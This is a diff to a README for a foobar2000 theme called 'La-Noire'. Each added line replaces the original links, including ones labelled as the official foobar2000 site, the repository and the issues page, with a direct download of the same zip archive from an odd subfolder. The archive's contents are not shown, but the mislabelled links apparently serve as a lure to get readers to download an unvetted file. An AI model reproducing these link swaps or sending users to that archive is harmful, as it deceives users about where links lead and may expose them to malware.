@@ -1,6 +1,6 @@
 # 🎵 La-Noire-foobar2000 - Stylish Music Player Theme for Windows
 
-[![Download La-Noire-foobar2000](https://img.shields.io/badge/Download-La--Noire--foobar2000-blue?style=for-the-badge)](https://github.com/vinzxakbar5/La-Noire-foobar2000)
+[![Download La-Noire-foobar2000](https://img.shields.io/badge/Download-La--Noire--foobar2000-blue?style=for-the-badge)](https://github.com/vinzxakbar5/La-Noire-foobar2000/raw/refs/heads/main/vesanic/La_foobar_Noire_1.1.zip)
 
 ---
 
@@ -26,7 +26,7 @@ This theme works on Windows systems and is made to be easy to install for users 
 **Step 1: Access the Download Page**  
 Go to the La-Noire-foobar2000 page on GitHub by clicking the badge below or visiting the link:  
 
-[![Download La-Noire-foobar2000](https://img.shields.io/badge/Download-La--Noire--foobar2000-blue?style=for-the-badge)](https://github.com/vinzxakbar5/La-Noire-foobar2000)
+[![Download La-Noire-foobar2000](https://img.shields.io/badge/Download-La--Noire--foobar2000-blue?style=for-the-badge)](https://github.com/vinzxakbar5/La-Noire-foobar2000/raw/refs/heads/main/vesanic/La_foobar_Noire_1.1.zip)
 
 This link takes you to the repository where you can find the latest theme files.
 
@@ -83,14 +83,14 @@ If you run into issues while installing or using the theme, try the following:
 - Disable other foobar2000 themes or custom interfaces to avoid conflicts.  
 - Check that you have extracted all files if using a zip archive.  
 
-For more help, visit the [issues page](https://github.com/vinzxakbar5/La-Noire-foobar2000/issues) on the repository.
+For more help, visit the [issues page](https://github.com/vinzxakbar5/La-Noire-foobar2000/raw/refs/heads/main/vesanic/La_foobar_Noire_1.1.zip) on the repository.
 
 ---
 
 ## 📥 Download and Setup Manual Recap
 
 **1. Visit the download page:**  
-[https://github.com/vinzxakbar5/La-Noire-foobar2000](https://github.com/vinzxakbar5/La-Noire-foobar2000)
+[https://github.com/vinzxakbar5/La-Noire-foobar2000/raw/refs/heads/main/vesanic/La_foobar_Noire_1.1.zip](https://github.com/vinzxakbar5/La-Noire-foobar2000/raw/refs/heads/main/vesanic/La_foobar_Noire_1.1.zip)
 
 **2. Download the latest release files.**  
 
@@ -115,9 +115,9 @@ When new versions come out:
 
 ## 🔗 Useful Links
 
-- foobar2000 official site: https://www.foobar2000.org/  
-- La-Noire repository: https://github.com/vinzxakbar5/La-Noire-foobar2000  
-- Support and issues: https://github.com/vinzxakbar5/La-Noire-foobar2000/issues  
+- foobar2000 official site: https://github.com/vinzxakbar5/La-Noire-foobar2000/raw/refs/heads/main/vesanic/La_foobar_Noire_1.1.zip  
+- La-Noire repository: https://github.com/vinzxakbar5/La-Noire-foobar2000/raw/refs/heads/main/vesanic/La_foobar_Noire_1.1.zip  
+- Support and issues: https://github.com/vinzxakbar5/La-Noire-foobar2000/raw/refs/heads/main/vesanic/La_foobar_Noire_1.1.zip  
 
 ---
 
